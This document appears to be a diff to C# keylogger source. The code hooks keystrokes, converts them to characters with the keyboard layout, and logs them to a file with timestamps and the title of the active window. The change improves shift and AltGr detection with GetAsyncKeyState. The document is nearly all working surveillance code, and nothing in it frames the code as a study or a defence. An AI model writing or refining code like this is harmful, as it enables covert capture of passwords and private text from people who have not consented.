@@ -55,6 +55,7 @@ class KeyLogger
         {
             int vkCode = Marshal.ReadInt32(lParam);
 
+            // Detectar cambio de ventana activa
             IntPtr hWnd = GetForegroundWindow();
             StringBuilder winBuffer = new StringBuilder(256);
             GetWindowText(hWnd, winBuffer, 256);
@@ -68,25 +69,24 @@ class KeyLogger
                 logWriter.WriteLine("[" + time + "] Ventana: " + currentWindowTitle);
             }
 
-            IntPtr layout = GetKeyboardLayout(0);
+            // Preparar keyState para ToUnicodeEx
             byte[] keyState = new byte[256];
             GetKeyboardState(keyState);
 
-            if ((GetKeyState(VK_SHIFT) & 0x8000) != 0)
+            if ((GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0)
                 keyState[VK_SHIFT] = 0x80;
 
             if ((GetKeyState(VK_CAPITAL) & 0x0001) != 0)
                 keyState[VK_CAPITAL] = 0x01;
 
-            bool altgr = (GetKeyState(VK_RMENU) & 0x8000) != 0;
-
-            if (altgr)
+            if ((GetAsyncKeyState(VK_RMENU) & 0x8000) != 0) // AltGr
             {
                 keyState[VK_RMENU] = 0x80;
                 keyState[VK_MENU] = 0x80;
                 keyState[VK_CONTROL] = 0x80;
             }
 
+            IntPtr layout = GetKeyboardLayout(0);
             StringBuilder buffer = new StringBuilder(5);
             int result = ToUnicodeEx((uint)vkCode, 0, keyState, buffer, buffer.Capacity, 0, layout);
 
@@ -101,7 +101,7 @@ class KeyLogger
                 }
                 else if (char.IsLetter(raw[0]))
                 {
-                    bool shift = (GetKeyState(VK_SHIFT) & 0x8000) != 0;
+                    bool shift = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
                     bool caps = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
 
                     if (!shift && !caps && char.IsUpper(raw[0]))
@@ -193,6 +193,9 @@ class KeyLogger
 
     [DllImport("user32.dll")]
     private static extern short GetKeyState(int nVirtKey);
+
+    [DllImport("user32.dll")]
+    private static extern short GetAsyncKeyState(int vKey);
 
     [DllImport("user32.dll")]
     private static extern bool GetKeyboardState(byte[] lpKeyState);
